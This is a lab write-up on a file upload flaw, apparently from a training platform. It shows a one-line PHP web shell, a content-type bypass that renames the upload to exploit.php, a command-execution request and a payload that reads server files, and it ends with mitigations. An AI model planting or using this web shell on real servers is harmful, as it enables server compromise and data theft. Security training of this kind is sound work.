# Lab: File Upload – Remote Code Execution via Malicious File

## Goal
Determine whether the application properly validates uploaded files and prevents execution of malicious code.

## Observation
The application allows users to upload profile images. During testing, the upload feature only appeared to accept image files such as `.png` and `.jpeg`.

This suggested that the server performs basic file type validation, likely based on file extension or content type. However, improper validation of uploaded files can lead to server-side code execution if the server processes the uploaded file as executable code.

## Test
I uploaded a normal image file to observe how the upload request worked.

Using Burp Suite, I intercepted the POST request responsible for the upload. The request included:
- the uploaded file  
- the file name  
- the content type (`image/jpeg`)  

I then sent this request to Repeater to modify it.

## Payload
Inside the request body, I modified the uploaded file:

- Removed the original image content  
- Replaced it with a PHP payload:

```php
<?php echo system($_GET['command']); ?>
```

Then I changed the filename from:

```
image.jpg
```

to:

```
exploit.php
```

The `Content-Type` header remained:

```
Content-Type: image/jpeg
```

This bypassed the application's weak validation because it only checked the content type rather than the actual file content.

## Explanation of the Payload
```php
<?php echo system($_GET['command']); ?>
```

Breakdown:
- `$_GET['command']` retrieves a parameter from the URL  
- `system()` executes the command on the server  
- `echo` prints the output  

This allows execution of system commands via a URL parameter.

Example request:

```
GET /example/exploit.php?command=id HTTP/1.1
```

Explanation:
- `/example/exploit.php` is the uploaded malicious file  
- `command=id` executes the system command  

The `id` command returns:
- user ID  
- group ID  
- privileges  

This is commonly used to confirm successful remote code execution.

## Result
After uploading the malicious file, I accessed it via:

```
GET /example/exploit.php?command=id HTTP/1.1
```

The server executed the command and returned the output, confirming that the uploaded PHP file was executed.

This demonstrates a Remote Code Execution (RCE) vulnerability.

## Additional Exploitation
After confirming code execution, I modified the payload to read a file from the server:

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Explanation:
- `file_get_contents()` reads file contents from the server  
- the provided path determines which file is accessed  

This allowed retrieval of sensitive data required to complete the lab.

## Impact
Improper validation of uploaded files can allow attackers to upload executable scripts, leading to:
- remote code execution  
- server compromise  
- sensitive data exposure  
- full system control  

This is considered a high severity vulnerability.

## Key Learning
Applications must properly validate uploaded files by:
- restricting allowed file extensions  
- validating actual file content (not just headers)  
- storing uploads outside the web root  
- disabling execution permissions in upload directories  

Without these protections, attackers can upload malicious scripts and execute them on the server.
